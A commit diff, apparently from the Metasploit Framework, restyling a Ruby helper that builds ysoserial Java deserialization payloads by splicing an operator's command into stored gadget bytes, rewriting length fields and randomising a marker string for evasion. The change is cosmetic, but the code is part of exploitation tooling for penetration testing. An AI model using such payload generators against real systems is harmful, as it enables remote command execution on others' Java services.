85555b81c4c26ad099a919422578c4535c3998a8
Wei Chen <wei_chen@rapid7.com>
2019-01-15 17:08:54 -0600

    Update code for Ruby coding style standards

--- lib/msf/util/java_deserialization.rb
+++ lib/msf/util/java_deserialization.rb
@@ -2,54 +2,54 @@ module Msf
 module Util
 
 require 'json'
-require 'base64'
 
-#TODO: Support ysoserial alongside ysoserial-modified payloads (including cmd, bash, powershell, none)
+# TODO:
+# Support ysoserial alongside ysoserial-modified payloads (including cmd, bash, powershell, none)
 
 class JavaDeserialization
 
   PAYLOAD_FILENAME = "ysoserial_payloads.json"
 
-  def self.ysoserial_payload(payloadName, command=nil)
+  def self.ysoserial_payload(payload_name, command=nil)
     # Open the JSON file and parse it
     begin
       path = File.join(Msf::Config.data_directory, PAYLOAD_FILENAME)
       json = JSON.parse(File.read(path))
-    rescue Errno::ENOENT
+    rescue Errno::ENOENT, JSON::ParserError
       raise RuntimeError, "Unable to load JSON data from 'data/#{PAYLOAD_FILENAME}'"
     end
 
-    raise ArgumentError, "#{payloadName} payload not found in ysoserial payloads" if json[payloadName].nil?
+    raise ArgumentError, "#{payload_name} payload not found in ysoserial payloads" if json[payload_name].nil?
 
     # Extract the specified payload (status, lengthOffset, bufferOffset, bytes)
-    payload = json[payloadName]
+    payload = json[payload_name]
 
     # Based on the status, we'll raise an exception, return a static payload, or
-    #   generate a dynamic payload with modifications at the specified offsets
+    # generate a dynamic payload with modifications at the specified offsets
     case payload['status']
-    when "unsupported"
+    when 'unsupported'
       # This exception will occur most commonly with complex payloads that require more than a string
-      raise ArgumentError, "ysoserial payload is unsupported"
-    when "static"
-      #TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
-      return Base64.decode64(payload['bytes'])
-    when "dynamic"
-      raise ArgumentError, "missing command parameter" if command.nil?
+      raise ArgumentError, 'ysoserial payload is unsupported'
+    when 'static'
+      # TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
+      return Rex::Text.decode_base64(payload['bytes'])
+    when 'dynamic'
+      raise ArgumentError, 'missing command parameter' if command.nil?
 
-      bytes = Base64.decode64(payload['bytes'])
+      bytes = Rex::Text.decode_base64(payload['bytes'])
 
       # Insert buffer
-      bufferOffset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
-      bytes[bufferOffset-1] += command
+      buffer_offset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
+      bytes[buffer_offset - 1] += command
 
       # Overwrite length (multiple times, if necessary)
-      lengthOffsets = payload['lengthOffset']
-      lengthOffsets.each do |lengthOffset|
+      length_offsets = payload['lengthOffset']
+      length_offsets.each do |length_offset|
         # Extract length as a 16-bit unsigned int, then add the length of the command string
-        length  = bytes[lengthOffset-1..lengthOffset].unpack("n").first
+        length  = bytes[(length_offset-1)..length_offset].unpack('n').first
         length += command.length.ord
         length  = [length].pack("n")
-        bytes[lengthOffset-1..lengthOffset] = length
+        bytes[(length_offset-1)..length_offset] = length
       end
 
       # Replace "ysoserial\/Pwner" timestamp string with randomness for evasion
@@ -57,7 +57,7 @@ class JavaDeserialization
 
       return bytes
     else 
-      raise RuntimeError, "Malformed JSON file"
+      raise RuntimeError, 'Malformed JSON file'
     end
   end
 end
